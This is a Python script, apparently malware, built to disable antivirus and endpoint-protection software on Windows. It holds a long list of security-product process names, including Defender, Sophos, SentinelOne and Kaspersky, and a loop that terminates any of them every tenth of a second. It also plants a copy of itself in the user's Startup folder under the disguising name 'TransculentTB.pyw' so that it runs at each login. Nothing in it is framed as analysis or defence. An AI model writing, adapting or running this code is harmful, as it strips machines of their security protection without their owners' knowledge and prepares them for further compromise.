import psutil
import os
import time
import getpass
import shutil
from difflib import SequenceMatcher

av_processes = [
    # Malwarebytes
    "mbamservice.exe",
    "mbamtray.exe",
    "mbam.exe",
    "mb-setup.exe",
    "mbam-setup.exe",
    "malwarebytes-setup.exe",
    
    # Avast
    "AvastSvc.exe",
    "avastui.exe",
    "aswidsagent.exe",
    "ashServ.exe",
    "aswUpdSvc.exe",
    "AvastSetup.exe",
    "avast_setup.exe",
    
    # AVG
    "avgnt.exe",
    "avgsvc.exe",
    "avgsetup.exe",
    "avg_setup.exe",
    
    # Bitdefender
    "bdagent.exe",
    "vsserv.exe",
    "bdreplay.exe",
    "bdsetup.exe",
    "bitdefender-setup.exe",
    
    # Norton
    "ccSvcHst.exe",
    "NortonSecurity.exe",
    "NortonAutoProtect.exe",
    "navapsvc.exe",
    "NortonSetup.exe",
    "norton-setup.exe",
    
    # McAfee
    "McShield.exe",
    "mfevtps.exe",
    "mfefire.exe",
    "mcafee.exe",
    "McAfeeSetup.exe",
    "mcafee-setup.exe",
    
    # Sophos
    "SophosAgent.exe",
    "savservice.exe",
    "SophosAutoUpdateService.exe",
    "SophosSetup.exe",
    "sophos-setup.exe",
    
    # Avira
    "Avira.ServiceHost.exe",
    "avshadow.exe",
    "avguard.exe",
    "AviraSetup.exe",
    "avira-setup.exe",
    
    # Comodo
    "cmdagent.exe",
    "comodo.exe",
    "cavscan.exe",
    "ComodoSetup.exe",
    "comodo-setup.exe",
    
    # ESET
    "esets_tray.exe",
    "ekrn.exe",
    "egui.exe",
    "ESETSetup.exe",
    "eset-setup.exe",
    
    # Kaspersky
    "kav.exe",
    "klnagent.exe",
    "KasperskySetup.exe",
    "kaspersky-setup.exe",
    
    # F-Secure
    "f-secure.exe",
    "fsav32.exe",
    "fsgk32st.exe",
    "F-SecureSetup.exe",
    "f-secure-setup.exe",
    
    # Trend Micro
    "TmPfw.exe",
    "TmProxy.exe",
    "Tmntsrv.exe",
    "PccNTMon.exe",
    "TrendMicroSetup.exe",
    "trendmicro-setup.exe",
    
    # Webroot
    "wrlessmon.exe",
    "WebrootSecureAnywhere.exe",
    "WebrootSetup.exe",
    "webroot-setup.exe",
    
    # Panda Security
    "PSANHost.exe",
    "PSUAService.exe",
    "PandaSecuritySetup.exe",
    "panda-setup.exe",
    
    # Emsisoft
    "a2service.exe",
    "a2start.exe",
    "EmsisoftSetup.exe",
    "emsisoft-setup.exe",
    
    # VIPRE
    "vipreagent.exe",
    "SBAMSvc.exe",
    "VIPRESetup.exe",
    "vipre-setup.exe",
    
    # Ad-Aware
    "AdAwareService.exe",
    "AdAwareTray.exe",
    "AdAwareSetup.exe",
    "adaware-setup.exe",
    
    # ClamWin
    "clamwin.exe",
    "clamd.exe",
    "freshclam.exe",
    "ClamWinSetup.exe",
    "clamwin-setup.exe",
    "AgentSvc.exe",
    "PSUAMain.exe",
    "PSANHost.exe",
    "PSUAService.exe",
    "active_protection_service.exe",
    "SonicWallClientProtectionService.exe",
    "klserver.exe",
    "kavfsscs.exe",
    "kavfs.exe",
    "kavtray.exe",
    "kavfswp.exe",
    "ebloader.exe",
    "klactprx.exe",
    "SrvLauncher.exe",
    "klnagent.exe",
    "klcsweb.exe",
    "soyuz.exe",
    "kavfswh.exe",
    "avp.exe",
    "avpsus.exe",
    "avpui.exe",
    "ksde.exe",
    "ksdeui.exe",
    "MsMpEng.exe",
    "MSASCui.exe",
    "MSASCuiL.exe",
    "MBAMService.exe",
    "Smc.exe",
    "ccSvcHst.exe",
    "SmcGui.exe",
    "bdservicehost.exe",
    "EPProtectedService.exe",
    "EPIntegrationService.exe",
    "EPSecurityService.exe",
    "EPUpdateService.exe",
    "bdredline.exe",
    "epconsole.exe",
    "BDFsTray.exe",
    "BDFileServer.exe",
    "bdemsrv.exe",
    "BDAvScanner.exe",
    "Arrakis3.exe",
    "bdlived2.exe",
    "BDLogger.exe",
    "bdlserv.exe",
    "bdregsvr2.exe",
    "BDScheduler.exe",
    "BDStatistics.exe",
    "npemclient3.exe",
    "ephost.exe",
    "hmpalert.exe",
    "ALsvc.exe",
    "McsAgent.exe",
    "McsClient.exe",
    "SEDService.exe",
    "Sophos UI.exe",
    "SophosUI.exe",
    "SophosFileScanner.exe",
    "SophosFS.exe",
    "SophosFIMService.exe",
    "SophosHealth.exe",
    "SLDService.exe",
    "VipreAAPSvc.exe",
    "VipreNis.exe",
    "SBAMSvc.exe",
    "SBAMTray.exe",
    "SBPIMSvc.exe",
    "threatlockerservice.exe",
    "threatlockertray.exe",
    "ThreatLockerConsent.exe",
    "Healthservice.exe",
    "SentinelUI.exe",
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelHelperService.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",
    "SentinelStaticEngineScanner.exe",
    "SophosADSyncService.exe",
    "swi_fc.exe",
    "swi_filter.exe",
    "SophosLiveQueryService.exe",
    "SophosMTR.exe",
    "SophosMTRExtension.exe",
    "SophosNetFilter.exe",
    "SophosNtpService.exe",
    "SophosOsquery.exe",
    "SophosOsqueryExtension.exe",
    "SSPService.exe",
    "SavService.exe",
    "swi_service.exe",
    "SSPService.exe",
    "SophosSafestore64.exe",
    "SophosCleanM64.exe",
    "swc_service.exe",
    "SAVAdminService.exe",
    "sdcservice.exe",
    "SavApi.exe",
    "ManagementAgentNT.exe",
    "CertificationManagerServiceNT.exe",
    "ALMon.exe",
    "MgntSvc.exe",
    "RouterNT.exe",
    "SophosUpdateMgr.exe",
    "SUMService.exe",
    "Sophos.PolicyEvaluation.Service.exe",
    "msseces.exe",
    "ekrn.exe",
    "egui.exe",
    "EraAgentSvc.exe",
    "eguiProxy.exe",
    "PccNt.exe",
    "TmCCSF.exe",
    "svcGenericHost.exe",
    "TMBMSRV.exe",
    "iCRCService.exe",
    "tmicAgentSetting.exe",
    "OfcService.exe",
    "DbServer.exe",
    "NTRTScan.exe",
    "CNTAoSMgr.exe",
    "SRService.exe",
    "LWCSService.exe",
    "DbServer.exe",
    "ofcDdaSvr.exe",
    "PccNTMon.exe",
    "TmListen.exe",
    "iVPAgent.exe",
    "TmPfw.exe",
    "ESClient.exe",
    "TmSSClient.exe",
    "TmsaInstance64.exe",
    "ESEServiceShell.exe",
    "ESEFrameworkHost.exe",
    "AvastSvc.exe",
    "AvastUI.exe",
    "aswToolsSvc.exe",
    "aswEngSrv.exe",
    "aswidsagent.exe"
]

def kill_av():
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in [x.lower() for x in av_processes]:
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        time.sleep(0.1)

contents = """
import psutil
import os
import time
import getpass
import shutil
from difflib import SequenceMatcher

av_processes = [
    # Malwarebytes
    "mbamservice.exe",
    "mbamtray.exe",
    "mbam.exe",
    "mb-setup.exe",
    "mbam-setup.exe",
    "malwarebytes-setup.exe",
    
    # Avast
    "AvastSvc.exe",
    "avastui.exe",
    "aswidsagent.exe",
    "ashServ.exe",
    "aswUpdSvc.exe",
    "AvastSetup.exe",
    "avast_setup.exe",
    
    # AVG
    "avgnt.exe",
    "avgsvc.exe",
    "avgsetup.exe",
    "avg_setup.exe",
    
    # Bitdefender
    "bdagent.exe",
    "vsserv.exe",
    "bdreplay.exe",
    "bdsetup.exe",
    "bitdefender-setup.exe",
    
    # Norton
    "ccSvcHst.exe",
    "NortonSecurity.exe",
    "NortonAutoProtect.exe",
    "navapsvc.exe",
    "NortonSetup.exe",
    "norton-setup.exe",
    
    # McAfee
    "McShield.exe",
    "mfevtps.exe",
    "mfefire.exe",
    "mcafee.exe",
    "McAfeeSetup.exe",
    "mcafee-setup.exe",
    
    # Sophos
    "SophosAgent.exe",
    "savservice.exe",
    "SophosAutoUpdateService.exe",
    "SophosSetup.exe",
    "sophos-setup.exe",
    
    # Avira
    "Avira.ServiceHost.exe",
    "avshadow.exe",
    "avguard.exe",
    "AviraSetup.exe",
    "avira-setup.exe",
    
    # Comodo
    "cmdagent.exe",
    "comodo.exe",
    "cavscan.exe",
    "ComodoSetup.exe",
    "comodo-setup.exe",
    
    # ESET
    "esets_tray.exe",
    "ekrn.exe",
    "egui.exe",
    "ESETSetup.exe",
    "eset-setup.exe",
    
    # Kaspersky
    "kav.exe",
    "klnagent.exe",
    "KasperskySetup.exe",
    "kaspersky-setup.exe",
    
    # F-Secure
    "f-secure.exe",
    "fsav32.exe",
    "fsgk32st.exe",
    "F-SecureSetup.exe",
    "f-secure-setup.exe",
    
    # Trend Micro
    "TmPfw.exe",
    "TmProxy.exe",
    "Tmntsrv.exe",
    "PccNTMon.exe",
    "TrendMicroSetup.exe",
    "trendmicro-setup.exe",
    
    # Webroot
    "wrlessmon.exe",
    "WebrootSecureAnywhere.exe",
    "WebrootSetup.exe",
    "webroot-setup.exe",
    
    # Panda Security
    "PSANHost.exe",
    "PSUAService.exe",
    "PandaSecuritySetup.exe",
    "panda-setup.exe",
    
    # Emsisoft
    "a2service.exe",
    "a2start.exe",
    "EmsisoftSetup.exe",
    "emsisoft-setup.exe",
    
    # VIPRE
    "vipreagent.exe",
    "SBAMSvc.exe",
    "VIPRESetup.exe",
    "vipre-setup.exe",
    
    # Ad-Aware
    "AdAwareService.exe",
    "AdAwareTray.exe",
    "AdAwareSetup.exe",
    "adaware-setup.exe",
    
    # ClamWin
    "clamwin.exe",
    "clamd.exe",
    "freshclam.exe",
    "ClamWinSetup.exe",
    "clamwin-setup.exe",
    "AgentSvc.exe",
    "PSUAMain.exe",
    "PSANHost.exe",
    "PSUAService.exe",
    "active_protection_service.exe",
    "SonicWallClientProtectionService.exe",
    "klserver.exe",
    "kavfsscs.exe",
    "kavfs.exe",
    "kavtray.exe",
    "kavfswp.exe",
    "ebloader.exe",
    "klactprx.exe",
    "SrvLauncher.exe",
    "klnagent.exe",
    "klcsweb.exe",
    "soyuz.exe",
    "kavfswh.exe",
    "avp.exe",
    "avpsus.exe",
    "avpui.exe",
    "ksde.exe",
    "ksdeui.exe",
    "MsMpEng.exe",
    "MSASCui.exe",
    "MSASCuiL.exe",
    "MBAMService.exe",
    "Smc.exe",
    "ccSvcHst.exe",
    "SmcGui.exe",
    "bdservicehost.exe",
    "EPProtectedService.exe",
    "EPIntegrationService.exe",
    "EPSecurityService.exe",
    "EPUpdateService.exe",
    "bdredline.exe",
    "epconsole.exe",
    "BDFsTray.exe",
    "BDFileServer.exe",
    "bdemsrv.exe",
    "BDAvScanner.exe",
    "Arrakis3.exe",
    "bdlived2.exe",
    "BDLogger.exe",
    "bdlserv.exe",
    "bdregsvr2.exe",
    "BDScheduler.exe",
    "BDStatistics.exe",
    "npemclient3.exe",
    "ephost.exe",
    "hmpalert.exe",
    "ALsvc.exe",
    "McsAgent.exe",
    "McsClient.exe",
    "SEDService.exe",
    "Sophos UI.exe",
    "SophosUI.exe",
    "SophosFileScanner.exe",
    "SophosFS.exe",
    "SophosFIMService.exe",
    "SophosHealth.exe",
    "SLDService.exe",
    "VipreAAPSvc.exe",
    "VipreNis.exe",
    "SBAMSvc.exe",
    "SBAMTray.exe",
    "SBPIMSvc.exe",
    "threatlockerservice.exe",
    "threatlockertray.exe",
    "ThreatLockerConsent.exe",
    "Healthservice.exe",
    "SentinelUI.exe",
    "SentinelAgent.exe",
    "SentinelAgentWorker.exe",
    "SentinelHelperService.exe",
    "SentinelServiceHost.exe",
    "SentinelStaticEngine.exe",
    "SentinelStaticEngineScanner.exe",
    "SophosADSyncService.exe",
    "swi_fc.exe",
    "swi_filter.exe",
    "SophosLiveQueryService.exe",
    "SophosMTR.exe",
    "SophosMTRExtension.exe",
    "SophosNetFilter.exe",
    "SophosNtpService.exe",
    "SophosOsquery.exe",
    "SophosOsqueryExtension.exe",
    "SSPService.exe",
    "SavService.exe",
    "swi_service.exe",
    "SSPService.exe",
    "SophosSafestore64.exe",
    "SophosCleanM64.exe",
    "swc_service.exe",
    "SAVAdminService.exe",
    "sdcservice.exe",
    "SavApi.exe",
    "ManagementAgentNT.exe",
    "CertificationManagerServiceNT.exe",
    "ALMon.exe",
    "MgntSvc.exe",
    "RouterNT.exe",
    "SophosUpdateMgr.exe",
    "SUMService.exe",
    "Sophos.PolicyEvaluation.Service.exe",
    "msseces.exe",
    "ekrn.exe",
    "egui.exe",
    "EraAgentSvc.exe",
    "eguiProxy.exe",
    "PccNt.exe",
    "TmCCSF.exe",
    "svcGenericHost.exe",
    "TMBMSRV.exe",
    "iCRCService.exe",
    "tmicAgentSetting.exe",
    "OfcService.exe",
    "DbServer.exe",
    "NTRTScan.exe",
    "CNTAoSMgr.exe",
    "SRService.exe",
    "LWCSService.exe",
    "DbServer.exe",
    "ofcDdaSvr.exe",
    "PccNTMon.exe",
    "TmListen.exe",
    "iVPAgent.exe",
    "TmPfw.exe",
    "ESClient.exe",
    "TmSSClient.exe",
    "TmsaInstance64.exe",
    "ESEServiceShell.exe",
    "ESEFrameworkHost.exe",
    "AvastSvc.exe",
    "AvastUI.exe",
    "aswToolsSvc.exe",
    "aswEngSrv.exe",
    "aswidsagent.exe"
]

def kill_av():
    while True:
        for proc in psutil.process_iter(['name']):
            try:
                if proc.info['name'].lower() in [x.lower() for x in av_processes]:
                    proc.terminate()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        time.sleep(0.1)
kill_av()
"""

startup_folder = os.path.join(
    "C:\\Users", getpass.getuser(), "AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
)
script_path = os.path.join(startup_folder, "TransculentTB.pyw")

with open(script_path, "w") as startup_file:
    startup_file.write(contents)
kill_av()